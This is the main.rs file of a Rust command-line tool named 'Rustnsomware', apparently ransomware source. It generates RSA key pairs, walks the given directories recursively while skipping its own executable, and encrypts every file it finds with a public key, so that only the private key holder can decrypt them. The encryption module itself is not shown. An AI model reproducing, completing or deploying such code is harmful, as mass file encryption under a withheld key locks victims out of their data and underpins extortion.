mod encryption;
mod utils;

use clap::Parser;
use encryption::{decrypt_file, encrypt_file, generate_keys};
use openssl::rsa::Rsa;
use std::collections::LinkedList;
use std::fs::{self};
use std::path::Path;
use std::env;
use utils::get_file_as_byte_vec;

/// > Rustnsomware: encrypt and decrypt filesystem
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(long)]
    private_key: Option<String>,

    #[arg(long)]
    public_key: Option<String>,

    #[arg(short, long, value_enum)]
    command: Option<RustnsomwareCommand>,

    #[arg(short, long)]
    verbose: bool,

    #[clap(value_parser, num_args = 1.., value_delimiter = ' ')]
    paths: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum RustnsomwareCommand {
    GenerateKeys,
    Encrypt,
    Decrypt,
}

fn traverse_file_tree(args: &Args, callback: &dyn Fn(&Path) -> ()) {
    let program_name = env::current_exe().expect("WTF??");

    let mut files: LinkedList<String> = LinkedList::new();
    args.paths.iter().for_each(|file| {
        files.push_back(String::from(file));
    });

    while !files.is_empty() {
        let current_file = files.pop_front().expect("This should not happen");
        let metadata = fs::metadata(current_file.clone()).unwrap();

        if current_file.as_str() == program_name.file_name().unwrap().to_str().unwrap() {
            continue;
        }

        if args.verbose {
            print!("Processing {}", current_file)
        }

        if metadata.is_dir() {
            fs::read_dir(current_file).unwrap().for_each(|f| {
                files.push_back(String::from(
                    f.unwrap().path().canonicalize().unwrap().to_string_lossy(),
                ));
            });
        } else if metadata.is_file() {
            callback(Path::new(&current_file))
        }
    }
}

fn execute_command(command: RustnsomwareCommand, args: &Args) {
    match command {
        RustnsomwareCommand::GenerateKeys => generate_keys(),
        RustnsomwareCommand::Encrypt => {
            let public_key = Rsa::public_key_from_pem_pkcs1(&get_file_as_byte_vec(
                &args.public_key.clone().expect("No public key path"),
            ))
            .expect("Invalid public key");

            traverse_file_tree(args, &|path: &Path| {
                encrypt_file(public_key.to_owned(), path);
            });
        }
        RustnsomwareCommand::Decrypt => {
            let private_key = Rsa::private_key_from_pem(&get_file_as_byte_vec(
                &args.private_key.clone().expect("No private key path"),
            ))
            .expect("Invalid private key");

            traverse_file_tree(args, &|path: &Path| {
                decrypt_file(private_key.to_owned(), &path)
            });
        }
    }
}

fn main() {
    let args = Args::parse();
    let command = &args.command;
    match command.to_owned() {
        None => {
            println!("No command provided, exiting");
            std::process::exit(1);
        }
        Some(command) => execute_command(command, &args),
    }

    std::process::exit(0);
}
